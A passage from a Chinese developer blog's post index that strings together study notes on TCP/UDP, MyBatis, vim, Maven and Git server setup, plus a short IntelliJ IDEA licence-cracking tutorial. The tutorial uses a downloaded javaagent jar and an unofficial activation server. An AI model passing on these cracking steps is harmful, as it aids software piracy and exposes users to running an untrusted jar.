音视频传输 DNS Ping 直播 模糊地带 HTTP (目前以 TCP 为主) 文件传输 UDP 不提供可靠性，不代表不能解决可靠性 UDP 的核心价值：灵活、轻便，构造了最小版本的传输层协议我们可以为 UDP 实现连接 (Connection)，实现会话 (Session),实现可靠性 (Reliability) … 总结 TCP 协议可以培养思维的缜密性 （序号的设计，滑动窗口的设计，快速重发的设计，内在状态机的设计） UDP 协议可以带动我们反思自己的技术架构 报文传输 - 可靠性 - 流量控制 - 连接和会话 TCP 最核心的价值就是提供好了一套解决可靠性的优秀方案 TCP 在确保吞吐量、延迟、丢包率的基础上，保证可靠性 UDP 提供了最小版的实现，只支持 Checksum UDP 最核心的价值：灵活、轻量、传输速度快","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP-滑动窗口-流速控制","slug":"计网/TCP-滑动窗口-流速控制","date":"2021-06-20T15:53:20.000Z","updated":"2021-06-21T08:26:55.771Z","comments":true,"path":"2021/06/20/计网/TCP-滑动窗口-流速控制/","link":"","permalink":"https://www.shanghua.live/2021/06/20/%E8%AE%A1%E7%BD%91/TCP-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3-%E6%B5%81%E9%80%9F%E6%8E%A7%E5%88%B6/","excerpt":"","text":"!! 此篇博客内容来自 拉勾教育 作为一个传输层协议，最核心的能力是传输，传输需要保证可靠性，还需要控制流速，这两个核心均由滑动窗口提供 请求/响应模型每一个请求收到响应之后，再发送下一个请求，吞吐量会很低。因为这样的设计，会产生网络的空闲时间，说白了，就是浪费带宽。带宽没有用满，意味着可以同时发送更多的请求，接收更多的响应。 一种改进的方式，就是让发送方有请求就发送出去，而不是等待响应。通过这样的处理方式，发送的数据连在了一起，响应的数据也连在了一起，吞吐量就提升了。 排队（Queuing）在这种情况下，我们通常会考虑排队机制 这样做就需要多个队列，我们要将未发送的数据从队列中取出，加入发送中的队列。然后再将发送中的数据，收到 ACK 的部分取出，放入已接收的队列。而发送中的封包，何时收到 ACK 是一件不确定的事情，这样使用队列似乎也有一定的问题。 滑动窗口（Sliding Window） 深绿色代表已经收到 ACK 的段 浅绿色代表发送了，但是没有收到 ACK 的段 白色代表没有发送的段 紫色代表暂时不能发送的段 这个时候滑动窗口可以向右滑动，如下图所示： 重传如果发送过程中，部分数据没能收到 ACK 会怎样呢？这就可能发生重传。如果发生下图这样的情况，段 4 迟迟没有收到 ACK。 这个时候滑动窗口只能右移一个位置，如下图所示： 在这个过程中，如果后来段 4 重传成功（接收到 ACK），那么窗口就会继续右移。如果段 4 发送失败，还是没能收到 ACK，那么接收方也会抛弃段 5、段 6、段 7。这样从段 4 开始之后的数据都需要重发。 快速重传在 TCP 协议中，如果接收方想丢弃某个段，可以选择不发 ACK。发送端超时后，会重发这个 TCP 段。而有时候，接收方希望催促发送方尽快补发某个 TCP 段，这个时候可以使用快速重传能力。例如段 1、段 2、段 4 到了，但是段 3 没有到。 接收方可以发送多次段 3 的 ACK。如果发送方收到多个段 3 的 ACK，就会重发段 3。这个机制称为快速重传。这和超时重发不同，是一种催促的机制。为了不让发送方误以为段 3 已经收到了，在快速重传的情况下，接收方即便收到发来的段 4，依然会发段 3 的 ACK（不发段 4 的 ACK），直到发送方把段 3 重传。 流速控制假设 RTT = 1ms, 带宽是 1mb/s如果窗口大小为 1kb，那么 1ms 可以发送一个 1kb 段数据（含 TCP 头）1s 就可以发送 1mb 的数据，刚好可以将带宽用慢如果 RTT 再慢一些，比如 RTT = 10ms ,这样的设计就只能用完 1/10 的带宽 总结有了窗口，发送方利用滑动窗口算法发送消息；接收方构造缓存区接受消息，并给发送方 ACK 滑动窗口是 TCP 协议控制可靠性的核心，发送方将数据拆包，变成多个分组，然后讲数据放入一个拥有滑动窗口的数组，依次发出，然后遵循，先入先出（FIFO）的顺序单数窗口中的分组会一次性发送。窗口中序号最小的分组如果收到 ACK ，窗口就会发生滑动，如果最小序号的分组长时间没有收到 ACK，就会触发整个窗口的数据重新发送","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"TCP-封包-拆包","slug":"计网/TCP-封包-拆包","date":"2021-06-20T13:16:22.000Z","updated":"2021-06-21T08:26:53.271Z","comments":true,"path":"2021/06/20/计网/TCP-封包-拆包/","link":"","permalink":"https://www.shanghua.live/2021/06/20/%E8%AE%A1%E7%BD%91/TCP-%E5%B0%81%E5%8C%85-%E6%8B%86%E5%8C%85/","excerpt":"","text":"TCP 封包 TCP 协议是如何恢复数据的顺序的 ? 拆包和粘包的作用是什么 ? TCP 是一个传输协议，会讲数据进行拆分进行发送，为什么不分批发送？ 为了稳定性，一次性发送的数据越多，出错的概率越大 为了效率，拆分的数据包就能更好的利用这些并行的路径 发送和接受数据都有缓冲区，缓存区是在内存中开辟的一块区域，目的是缓冲 在传输层封包不能太大以缓存区大小为单位 TCP 协议： 会将数据拆分成不超过缓冲区大小的一个个部分 每个部分都有一个独特的名称，叫做 TCP 段（TCP Segment） 拆包：将数据拆分成多个 TCP 段传输 粘包：将多个数据合并成一个 TCP 段发送 TCP SegmentTCP 分组格式示意图 Source Port/DestinationPort 描述的事发送端口号和目标端口号，代表发送数据的应用程序和接受数据的应用程序 Sequence Number 和 Achnowlendgment Number 是保证可靠性的两个关键 Data Offset 是一个偏移量，原因：TCP Header 部分的长度可变，需要一个数值来描述数据从哪个字节开始 Reserved 是很多协议设计会保留的一个区域，用于日后扩展能力 URG/ACK/PSH/PST/SYN/FIN 是几个标志位，用来描述 TCP 段的行为 URG 代表一个紧急数据（比如终结程序） ACK 代表响应 PSH 代表数据的推送，传输数据 SYN 同步请求，申请握手 FIN 终止请求，挥手 这五个标志位一个占一个 bit 可同时使用 Window 也是 TCP 保证稳定性并进行流量控制的工具 Checksum 是校验和，用来校验 TCP 段有没有损坏 Urgent Poninter 指向最后一个紧急数据的序号（Sequece Number） Option 中存储了一些可选字段 MSS （Maxiumun Segment Size）(长度不固定) Padding 存在的意义是因为 Option 的长度不固定，需要 Pading 进行对齐 Sequece Number 和 Achnowlendgment Number拆包：数据被分成很多个部分，部分增加了协议头合并成一个 TCP 段，进行传输TCP 段经过复杂的网络结构，由底层的 IP 协议，负责传输到目的地，然后进行重组 稳定性要求是数据无损地传输（拆包获得的数据，又需要恢复到原来的样子）数据虽然是顺序发送的，但不能保证是顺序接受的发送的每一个 TCP 段都需要有序号 – Sequence Number（Seq） 发送数据的时候，为每一个 TCP 段分配一个自增的 Sequence Number 接受数据的时候，可以通过 Sequence Number 为乱序的 TCP 段进行排序 接收方回复发送方，也需要 seq，而网络的两个终端，去同步一个自增的序号是非常困难的 对于任何一个接收方，如果知道了发送者发送某个 TCP 段时，已经发送了多少个字节的数据，那么就可以确认发送者发送数据的顺序如果接收方也向发送者发送了数据请求，接收方就不知道发送者发送的数据到底对应哪一条自己发送的数据？每一个 TCP 段发送时，发送方已经接受了多少数据 Achnowlendgment（ACK） 无论是 Seq 和 ACK 都是针对 “对方” 而言的 MSS （Maxiumun Sequence Size） 重要的 TCP Header 中的可选择（Options） 可选性控制 TCP 段的大小，它是一个协商字段（Negotiate） 协商是双方都要遵循的标准，配置不能由单方决定，需要双方协商 TCP 段的大小（MSS）涉及发送、接收缓存区的大小设置 双方实际发送接受封包的大小，对拆包和粘包的过程有知道作用 设置的过大会降低性能 用户占用服务器太多的资源，意味着其他的用户就需要等待或者降低他们的服务质量 支持 TCP 协议工作的 IP 协议，工作效率会下降 IP 协议为什么需要拆包呢？ 在网络中，每次传输的数据不能太大，受限于具体的网络传输设备（物理特性） IP 协议拆分太多的封包并没有意义 可能会导致属于同个 TCP 段的封包被不同的网络线传输，加大延迟 拆包需要消耗硬件和计算资源 是不是 MSS 越小越好呢？ MSS 太小的情况，会浪费传输资源（降低吞吐量） 无法获得完美的解决方案需要实验测试她 总结 TCP 协议是如何恢复数据的顺序的，TCP 拆包和粘包的作用是什么 TCP 拆包的作用，将任务拆分处理，降低整体任务出错的概率，以及减小底层网络处理的压力，粘包过程需要保证数据经过网络的传输，又能恢复到原来的数据 需要数学提供保证顺序的理论依据，TCP 利用 （发送字节数，接受字节数）的唯一性来确认封包直接的顺序关系 TODO 本篇文章未完成","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"计算机网络入门-TCP/UDP","slug":"计网/计网-入门","date":"2021-06-19T11:23:11.000Z","updated":"2021-06-21T08:26:51.799Z","comments":true,"path":"2021/06/19/计网/计网-入门/","link":"","permalink":"https://www.shanghua.live/2021/06/19/%E8%AE%A1%E7%BD%91/%E8%AE%A1%E7%BD%91-%E5%85%A5%E9%97%A8/","excerpt":"为什么 TCP 握手三次，挥手却四次","text":"为什么 TCP 握手三次，挥手却四次 TCP 传输层协议，提供给 Host-To-Host 数据的可靠性传输，支持全双工，是一个连接导向的协议这里主要涉及到，主机到主机、连接、会话、双工/单工及可靠性 主机到主机（Host-To-Host）提供的是 Host-To-Host 传输，一台主机通过 TCP 发送数据到另一台主机可以是电脑-手机-平板TCP 协议往上上 应用到应用 (Application-To-Application) 的协议微信的聊天协议想要工作，就需要一个主机到主机的工具互联网协议群（TCP/IP 协议群） graph LR; A[应用层] --&gt; B[传输层] --&gt; C[网络层] --&gt; D[数据链路层] --&gt; E[物理层] 网络层 提供地址到地址的通讯，不负责信号在具体两个设备传递主机到主机为应用提供应用间通讯的能力 连接（Connection）连接数网络行为状态的记录通讯双方的一个约定，目标是让两个在通讯的程序之间产生一个默契，保证两个程序都在线而且尽快的响应对象的请求两个应用会维护一个关联的对象，比如双方 IP 和 端口 是多少？现在发送了多少数据了，状态健康吗，传输速度如何 双工/单工问题 问题名称 概念 需要几条线路 单工 在任何时刻，如果数据只能单向发送 只需 1 条 半双工 在任何时刻数据可以向一个方向传输 也可以在另一个反方向传输，而且交替进行 至少一条 全双工 如果任何时刻数据都可以双向收发 大于 1 条 线路，是一个抽象的概念，你可以并发的处理信号，达到模拟双工的目的TCP 一个双工协议，数据任何时候都可以双向传输客户端和服务的在 TCP 协议中有一个平等的名词 Host（主机） 可靠性 可靠性（数据保证无损传输）如果发送方按照顺序发送，然后数据无序地主网络间传输，就必须有一种算法在接受方将数据恢复原有的顺序 多播情况如果有一个消息到达任何一个接受者，那么所有接受者都必须收到这个消息 TCP 的握手和挥手TCP 是一个连接导向的协议，设计有建立连接（握手）和断开连接（挥手的过程） 如果一个 Host 主动向另一个 Host 发起连接，被称为 SYN （Synchronization），请求同步 如果一个 Host 主动断开请求，称之为 FIN （Finish），请求完成 如果一个 Host 给另一个 Host 发送数据，成为 PSH （Push），数据推送 接收方接受到数据后，都需要给发送方一个 ACK（Acknowledgement） 响应，如果不响应，发送方会以为需要重发请求保持连接的可靠性约束，TCP 协议要保证每一条发出的数据必须给返回 建立连接的过程（三次握手）sequenceDiagram 客户端-&gt;&gt;服务端:1.客户端发送消息给服务端（SYN） [一次握手] note over 服务端: 2. 服务端准备好进行连接 note right of 服务端: [服务端的准备，不算握手] 服务端-&gt;&gt;客户端: 3. 服务端针对客户端的 SYN 给一个 ACK [三四是同时发生的，算一次握手，第二次握手] 服务端-&gt;&gt;客户端: 4. 服务端发送一个 SYN 给客户端 [三四可以合并成一个 SYN-RCVD 作为一条响应] note over 客户端: 5. 客户端准备好进行连接 note left of 客户端: 客户端准备 不算握手 客户端-&gt;&gt;服务端: 6.客户端针对 SYN 给服务端一个 ACK [第三次握手] 为 TCP 协议增加协议头，在协议头中取对个位（bit），其中 SYN，ACK，PSH 都占有一个位 断开连接的过程（四次挥手） 客户端要求断开连接，发送一个断开的请求，这个叫做 （FIN） 服务端收到请求，然后给客户端一个 ACK，作为 FIN 的响应。 不能像握手一样马上穿回 FIN 回去，因为断开连接要处理的问题比较多，比如说客服务的还有发送出去的消息没有得到 ACK；也可能自己有资源要释放，因此不能将两条消息合并。所以客户端经过等待确认可以关闭连接了，再发生一条 FIN 给客户端 sequenceDiagram 客户端-&gt;&gt;服务端: FIN 请求断开连接 服务端-&gt;&gt;客户端: ACK 响应 客户端 FIN note over 服务端: 服务端处理完事情 服务端-&gt;&gt;客户端: FIN 请求断开连接 客户端-&gt;&gt;服务端: ACK 响应 服务端 FIN 总结 TCP 提供连接（Connection），让双法的传输更加的稳定、安全 TCP 没有直接提供会话，因为应用对会话的需求多种多样，比如聊天程序会话会保持双方的聊天记录，电商程序会话会保持购物车、订单一致，所以会话通常在 TCP 连接上进一步封装 TCP 是一个面相连接的协议（Connection-orented Protocol），说的就是 TCP 协议参与的双方（Host）在收发数据之前会先建立连接。 UDP 是一个面向报文（Datagramo-oriented） 的协议双方不需要建立连接，直接传送报文（数据） 最后，连接 u 要消耗更多的资源；比如说，在传输数据前，必须先协商建立连接，因此，不是每种场景都应该用连接导向的协议。比如视频播放的场景，如果使用连接导向的协议，服务端没向客户端推送一帧视频，客户端都要给服务端响应这是不合理的","categories":[],"tags":[{"name":"计网","slug":"计网","permalink":"https://www.shanghua.live/tags/%E8%AE%A1%E7%BD%91/"}]},{"title":"mybatis-源码分析","slug":"mybatis/mybatis-源码分析","date":"2020-07-28T00:00:00.000Z","updated":"2021-06-20T05:10:29.862Z","comments":true,"path":"2020/07/28/mybatis/mybatis-源码分析/","link":"","permalink":"https://www.shanghua.live/2020/07/28/mybatis/mybatis-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"传统 JDBC 的问题","text":"传统 JDBC 的问题 数据库配置信息存在硬编码问题 解决方法: 1,配置文件 频繁创建释放数据库连接 2,数据库连接池 sql、设置参数,获取结果集均存在硬编码问题 ３，配置文件 手动封装返回结果集，比较繁琐 4,反射，内省 自定义持久层框架设计思路 使用端：（项目）：引入自定义持久层的 jar 包 提供了两部分配置信息：数据库配置信息，sql 配置信息：sql 语句，参数类型，返回值类型 使用配置文件提供这两部分信息 sql Ｍ apConfig.xml 存放数据库配置信息，存放 mapper.xml 的全路径 mapper.xml: 存放 sql 配置信息 自定义持久从逛街本身：（工程）：本质就是对 JDBC 代码进行了封装 加载配置文件：根据配置文件的路径，加载配置文件成字符输入流，存储在内存中 创建 Resource 类 方法 InputStream getResourceAsStream(String path) 创建两个 JavaBean:(容器对象)：存放的就是配置文件解析出来的内容 Configuration:核心配置类：存放 sqlMapConfig.xml 解析的内容 MappedStatement：映射配置类：存放 mapper.xml 解析出来的内容 解析配置文件：dom4j 创建一个类：SqlSessionFactoryBuilder 方法: build (InputStream in) 第一 : 使用 dom4j 解析配置文件，将解析出来的内容封装到容器对象中 第二创建 SqlSessionFactory 对象;生产 sqlSession ：会话对象(工厂模式) 创建 SqlSessionFactory 接口实现类 DefaultSqlSessionFactory 第一 openSession():生产 sqlSession 创建 SqlSession 接口及实现类 DefaultSqlSession 定义对数据库的 crud 操作：selectList(),selectOne(),update(),delete() 创建 Executor 接口及实现类 SimpleExecutor query(Configuration,MappedStatement,Object…params) 执行的就是 JDBC 代码","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"}]},{"title":"mybatis-源码学习","slug":"mybatis/mybatis-源码学习","date":"2020-07-26T00:00:00.000Z","updated":"2021-06-20T05:10:29.989Z","comments":true,"path":"2020/07/26/mybatis/mybatis-源码学习/","link":"","permalink":"https://www.shanghua.live/2020/07/26/mybatis/mybatis-%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0/","excerpt":"传统 JDBC 弊端","text":"传统 JDBC 弊端 JDBC 底层没有用连接池,操作数据库需要频繁创建和关联链接.消耗很大的资源. 原生 jdbc 代码在 java 中,一旦我们需要修改 sql 的话,java 需要整体编译,不利于系统维护. 使用 PreparedStatement 预编译的话对变量进行设置 123 数字,这样的序号不利于维护. 返回 result 结果集也需要硬编码. mybatis 配置方式 使用 xml 方式并不需要创建 Mapper Class 文件 使用 注解方式需要创建 Mapper Class 文件 mybatis 核心概念 名称 意义 Configuration 管理 mysql-config.xml 全局配置关系类 SqlSessionFactory Session 管理工厂接口 Session SqlSession 是一个面向用户（程序员）的接口。SqlSession 提供了很多操作数据库的方法 Executor 执行其是一个接口（基于执行器、缓存执行器）作用: SqlSession 内部通过执行器操作数据库 MappendStatement 底层封装对象 作用: 对操作数据库存储封装,包括 sql 语句、输入输出 StatementHandler 具体操作数据库相关的 handler 接口 ResultSetHandler 具体操作数据库返回结果的 handler 接口","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Mybatis","slug":"Mybatis","permalink":"https://www.shanghua.live/tags/Mybatis/"}]},{"title":"vim 入门","slug":"Linux/vim-入门","date":"2020-07-24T00:00:00.000Z","updated":"2021-06-20T05:12:40.753Z","comments":true,"path":"2020/07/24/Linux/vim-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/24/Linux/vim-%E5%85%A5%E9%97%A8/","excerpt":"vim 常用快捷键移动光标","text":"vim 常用快捷键移动光标 h j k l 控制上下作用,也可以使用方向键 ctrl + b 屏幕往后移动一页 f 屏幕往前移动一页 u 屏幕往后移动半页 d 屏幕往前移动半页 shift + g == G 移动文章到最后 4 == $ 移动到所在行的行尾 6 == ^ 移动到光标所在行首 w 光标跳到下一个单词开头 e 光标跳到下一个单词的词尾 b 光标回到上个字的开头 :1 跳到第数字行 gg 进入到文本的开始 常用命令 :nu 显示当前行数 :set nu 显示所有行数 :set expandtab tab 为 4 个空格 :set autoindent 保持当前缩进 复制粘贴 yy 复制光标当前行 p 粘贴到当前光标下一行","categories":[],"tags":[{"name":"Vim","slug":"Vim","permalink":"https://www.shanghua.live/tags/Vim/"}]},{"title":"maven-入门","slug":"maven/maven-入门","date":"2020-07-20T00:00:00.000Z","updated":"2021-06-20T05:10:44.642Z","comments":true,"path":"2020/07/20/maven/maven-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/20/maven/maven-%E5%85%A5%E9%97%A8/","excerpt":"maven 使用简介","text":"maven 使用简介 maven 使用,在项目目录创建 pom.xml 文件,格式是 12345678910111213141516&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.wang&lt;/groupId&gt; &lt;artifactId&gt;shanghua-maven&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt;&lt;/project&gt; maven 使用一种约定大于配置的模式,所以项目必须严格按照 maven 的约定进行开发 maven 目录结构 src/main/java 内放如 java 源代码 src/main/resource 资源目录 src/test pom.xml maven 文件 maven 常用命令 mvn clean 清楚打包内容 mvn compile 编译项目 maven 测试 测试文件必须放入到 src/test/java,类名以 Test 开头,方法名以 test 开头 执行 mvn test 即可 执行所以 test 开头方法 编译好的 test 文件 在 target/test-classes 下 测试结果在 target/surefire-reports 下 使用 junit 进行测试,在 pom.xml 内加入 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; 加入后必须在需要执行的方法上加上 @Test 注解才会运行 maven 仓库 本地仓库 可通过修改本地 maven 配置文件 settings.xml &lt;localRepository&gt; 修改仓库目录 远程仓库可通过添加 mirror 节点添加. maven 项目依赖 依赖一个框架的时候,会同时依赖此项目的所以依赖 依赖优先原则 下方的依赖会覆盖上方的依赖 相同路径下的,配置在前优先 依赖范围 &lt;scope&gt; 配置在 &lt;dependency&gt; 下限制依赖范围 compile: 默认,编译范围,编译和打包都会依赖 provided:提供范围,编译时依赖,但不会打包进去,如 server-api.jar runtime: 运行时范围,打包时依赖,编译不会,如 mysql-connector.jar test: 测试范围,运行测试用例依赖,如 junit.jar, test jar 包只有 src/test 内的文件才能引用 system: 表示由系统中的 CLASSPATH 指定,编译时依赖,不会打包进去,配合 &lt;systemPath&gt; 一起使用,如 java.home 下的 tool.jar maven 依赖管理 父类内可声明 &lt;dependencyManagement&gt; 内部可写 &lt;dependencies&gt; 子类依赖父类后,并不会直接依赖父类 &lt;dependencyManagement&gt; 内声明的内容,只有声明后才会依赖,依赖可省略版本号 maven 默认属性 $&#123;basedir&#125; 项目根目录 $&#123;version&#125; 项目版本 $&#123;project.basedir&#125; 同 $&#123;basedir&#125; $&#123;project.version&#125; 同 $&#123;version&#125; $&#123;project.build.directory&#125; 构建目录,缺省为 target $&#123;project.build.sourcceEncoding&#125; 表示主源码的编码格式 $&#123;project.build.sourceDirectory&#125; 表示主源码路径 $&#123;project.build.finalName&#125; 表示输出文件名称 $&#123;project.build.outputDirectory&#125; 构建过程输出目录,缺省 target/classes 默认属性可在 resource 目录下配置文件 以及 pom.xml 内使用, 属性还可以通过 执行 mvn 命令是加入 -D 参数添加 项目生命周期123graph LRA[预编译] --&gt;B[编译] --&gt; C[编译测试类] --&gt; D[构建] --&gt; G[jar 包构建] --&gt; F[部署]D --&gt; H[war 包构建] --&gt; F[部署] maven 生命周期 clean : 清理生命周期,用于清理项目 default:默认生命周期,用于编译,打包,测试,部署等 site: 站点文档生成,用于构建站点文档 当执行下面生命周期的目录时,会将上方的生命周期走一边 maven 生命周期命令大部分是由插件完成的,例如 test 就是由 maven-surefire-plugin","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"}]},{"title":"maven-插件","slug":"maven/maven-插件","date":"2020-07-20T00:00:00.000Z","updated":"2021-06-20T05:10:44.547Z","comments":true,"path":"2020/07/20/maven/maven-插件/","link":"","permalink":"https://www.shanghua.live/2020/07/20/maven/maven-%E6%8F%92%E4%BB%B6/","excerpt":"maven 命令 mvn dependency:tree 可查看插件的依赖关系","text":"maven 命令 mvn dependency:tree 可查看插件的依赖关系 mvn archetype:generate 使用 maven 生成项目 mvn help:effective-pom maven 插件绑定 生命周期的阶段可以绑定具体的插件及目标 不同配置下同一阶段可以对应多个插件和目标 maven 绑定插件的目录在 MAVEN_HOME\\lib\\maven-core.jar\\META-INF\\plexus\\default-bindings.xml maven 插件使用示例 123456789101112131415161718192021222324&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;!-- 在执行 package后 将依赖复制到 $&#123;project.build.directory&#125;/alternateLocation 目录下--&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.2&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;copy-dependencies&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;!-- 指定 goal 执行位置--&gt; &lt;goals&gt; &lt;goal&gt;copy-dependencies&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;!-- 指定配置文件--&gt; &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/alternateLocation&lt;/outputDirectory&gt; &lt;overWriteReleases&gt;false&lt;/overWriteReleases&gt; &lt;overWriteSnapshots&gt;false&lt;/overWriteSnapshots&gt; &lt;overWriteIfNewer&gt;true&lt;/overWriteIfNewer&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 插件使用第二种方法 mvn groupId:artifactId:version:goal -D{参数名} 插件开发流程 创建 maven 插件项目 设定 packaging 为 maven-plugin 添加插件依赖 编写插件实现逻辑 打包构建插件 插件 pom 配置 创建 maven 项目 定义&lt;packaging&gt;maven-plugin&lt;/packaging&gt; 引入 maven-plugin-api maven-plugin-annotations 依赖 插件方法类继承 org.apache.maven.plugin.AbstractMojo 实现 execute 方法 可在全局变量上方加上 org.apache.maven.plugins.annotations.Parameter 注解,获取 maven 参数 maven nexus 私服 搭建完成后可通过添加 repositories 制定 maven 服务器 也可通过修改 maven setting.xml 中的 mirrors 全局指定服务器 如需要 deploy jar 包到私服,需要在 pom.xml 下的 distributionManagement 下制定私服地址,并在 setting.xml 文件下添加 server 节点添加用户获取权限,并且 server 下的 id 需要与 distributionManagement 下的 id 对应","categories":[],"tags":[{"name":"Java","slug":"Java","permalink":"https://www.shanghua.live/tags/Java/"},{"name":"Maven","slug":"Maven","permalink":"https://www.shanghua.live/tags/Maven/"}]},{"title":"git-入门","slug":"Git/git-入门","date":"2020-07-17T00:00:00.000Z","updated":"2021-06-20T05:11:51.904Z","comments":true,"path":"2020/07/17/Git/git-入门/","link":"","permalink":"https://www.shanghua.live/2020/07/17/Git/git-%E5%85%A5%E9%97%A8/","excerpt":"git 存储文件时候会将一个文件存储到一个数据库中","text":"git 存储文件时候会将一个文件存储到一个数据库中 git 常用命令 git init ./目录名 初始化，初始化后会创建一个 .git 文件夹 元数据存储在 objects 中 git add 将文件存储到暂存取 -A 将所有文件存储到暂存取 git rm –cached 将文件从暂存区删除，本地文件并不会被删除 git commit filename -m ‘first commit’ 将暂存区文件提交到本地仓库 git push -u origin master 将本地仓库提交到远程仓库 master git config –list 查看 git 配置环境 git show 查看最后一次提交 git 分支相关命令 git branch 默认查看分支 -avv 查看所有分支 -d 删除分支 git branch 分支名 父分支名 创建一个分支 git gc 当强制删除一个分支的时候，分支内的信息还是存在的，通过这个命令可打包项目信息，跳过删除的信息 git 解决冲突 当远程仓库内容被修改，pull 的时候由于本地仓库与远程仓库文件冲突，会进入到一个解决冲突的分支，需要解决冲突后，重新执行 add commit push 操作解决冲突 git 远程仓库 git remote add origin url 指定远程仓库 git remote add origin2 url 添加远程仓库 git remote origin set-url url 修改远程地址 git remote temove 分支名 删除远程仓库 git push –set-upstream origin master 上传至远程分支 git branch –track git tag git tag 查看当前 tag git tag tag 名 创建 tag git 日志管理 git log 查看日志 –oneline 简单查看 –graph 图形网络 git log 分支名 查看某个分支的日志 git log dev..master 查看多少个 master 没有提交到 dev 内 git 底层原理 git 存储对象(hashMap) find .git/objects/ -type f 查找所有 git 对象 git hash-object -w filename 存储一个文件，并返回 hash，相当与 git add git cat-file -p hash 通过 hash 查看文件内容，我们并不知道文件内容属于哪个文件 git cat-file -p master^{tree} 查看一个提交的文件的信息，包含文件名 git commit 提交会包含一个 commit 对象，对象包含一个文件对象，包含文件名以及对应的 keycommit 对象 还包含一个 src 树对象 书对象包含 层级目录对象，直至目录中的文件，文件包含文件名以及 key 通过 git log 可查看 commit 对象包含的 keygit cat-file -p key 可查看 commit 包含的内容内容包含一个 tree 对象以及一个树对象一个新 commit 产生的时候 改变的文件会将 上级的 key 改变 直到 commit key git 创建中央仓库 git init –bare shanghua.git 创建裸项目，只要能访问这个目录就能进行开发，甚至是共享文件夹 git clone root@ip:项目目录 通过这条命令可访问上一条命令在远程仓库创建的项目，通过 ssh 协议搭建 中央仓库 通过 nginx 搭建 http 中央仓库 http(dump) 协议 1234567server&#123; listen 80; server_name git.shanghua.com; location / &#123; root /data/git-repository; # 仓库地址 &#125;&#125; 重命名钩子mv hooks/post-update.sample hooks/post-update 本地克隆 git clone http://git.shanghua.com/shanghua.git 通过 git 协议搭建远程仓库 git 协议 123nohup git daemon --reuseaddr --base-path=&#x27;项目目录&#x27; &#x27;项目目录&#x27;默认端口是 9418git clone git://ip:9418/shanghua.git shanghua git 服务器搭建git gogs 服务器 gogs 官网 https://gogs.io/ 下载安装包 解压进入 gogs 目录 ./gogs web 即可运行 浏览器访问本地 ip:3000 即可初始化项目 gogs 可配置 邮箱服务器 gogs 备份 ./gogs backup -h 查看备份相关参数 ./gogs backup 默认备份,备份在当前目录 ./gogs backup –target=’输出目录’ –database-only –exclude-repos ./gogs restore –from=’备份文件’ 备份恢复","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://www.shanghua.live/tags/git/"}]},{"title":"IDEA 破解教程","slug":"Java/idea-破解","date":"2020-05-08T10:38:00.000Z","updated":"2021-06-20T05:09:17.259Z","comments":true,"path":"2020/05/08/Java/idea-破解/","link":"","permalink":"https://www.shanghua.live/2020/05/08/Java/idea-%E7%A0%B4%E8%A7%A3/","excerpt":"下载破解 jar 包 下载地址 下载后解压","text":"下载破解 jar 包 下载地址 下载后解压 打开 IDEA 在试用模式下点击 Help –&gt; Edit Custom VM Option 第一次点击会让创建一个文件，点击确定 在最后一行加入 -javaagent:你解压后jar包的位置 重启 IDEA IDEA 启动后点击 Help –&gt; Register –&gt; License server 在 Server address 内输入 http://fls.jetbrains-agent.com 点击 ACTIVATE 成功后点击 CONTINUE DONE 使用方法来自 https://zhile.io/2018/08/25/jetbrains-license-server-crack.html","categories":[],"tags":[{"name":"IDEA","slug":"IDEA","permalink":"https://www.shanghua.live/tags/IDEA/"}]},{"title":"可转债","slug":"股市/可转债","date":"2020-04-28T20:16:00.000Z","updated":"2021-06-20T05:12:09.575Z","comments":true,"path":"2020/04/29/股市/可转债/","link":"","permalink":"https://www.shanghua.live/2020/04/29/%E8%82%A1%E5%B8%82/%E5%8F%AF%E8%BD%AC%E5%80%BA/","excerpt":"打新可转债 判断新债 https://www.jisilu.cn/data/cbnew/#pre","text":"打新可转债 判断新债 